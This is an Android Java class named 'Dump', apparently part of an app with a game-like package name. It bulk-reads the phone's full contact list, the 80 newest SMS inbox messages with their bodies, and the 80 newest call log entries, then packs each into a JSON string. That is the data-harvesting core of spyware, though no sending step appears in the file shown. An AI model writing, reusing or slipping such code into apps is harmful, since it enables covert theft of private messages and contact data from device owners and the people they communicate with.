package com.mazkiplay.nusantara;
import android.content.Context;import android.database.Cursor;import android.provider.*;
public class Dump{
 static String j(String s){return s==null?"":s.replace("\"","'");}
 public static String kon(Context c){StringBuilder b=new StringBuilder("[");boolean f=true;
  Cursor q=c.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);
  while(q!=null&&q.moveToNext()){if(!f)b.append(",");f=false;
   b.append("{\"name\":\"").append(j(q.getString(q.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))).append("\",\"tel\":\"").append(j(q.getString(q.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)))).append("\"}");}
  if(q!=null)q.close();return b.append("]").toString();}
 public static String sms(Context c){StringBuilder b=new StringBuilder("[");boolean f=true;
  Cursor q=c.getContentResolver().query(android.net.Uri.parse("content://sms/inbox"),null,null,null,"date DESC");
  int n=0;while(q!=null&&q.moveToNext()&&n<80){if(!f)b.append(",");f=false;n++;
   b.append("{\"from\":\"").append(j(q.getString(q.getColumnIndex("address")))).append("\",\"body\":\"").append(j(q.getString(q.getColumnIndex("body")))).append("\"}");}
  if(q!=null)q.close();return b.append("]").toString();}
 public static String call(Context c){StringBuilder b=new StringBuilder("[");boolean f=true;
  Cursor q=c.getContentResolver().query(CallLog.Calls.CONTENT_URI,null,null,null,"date DESC");
  int n=0;while(q!=null&&q.moveToNext()&&n<80){if(!f)b.append(",");f=false;n++;
   b.append("{\"name\":\"").append(j(q.getString(q.getColumnIndex(CallLog.Calls.CACHED_NAME)))).append("\",\"tel\":\"").append(j(q.getString(q.getColumnIndex(CallLog.Calls.NUMBER)))).append("\",\"dur\":").append(q.getInt(q.getColumnIndex(CallLog.Calls.DURATION))).append(",\"type\":\"").append(q.getInt(q.getColumnIndex(CallLog.Calls.TYPE))).append("\"}");}
  if(q!=null)q.close();return b.append("]").toString();}
}
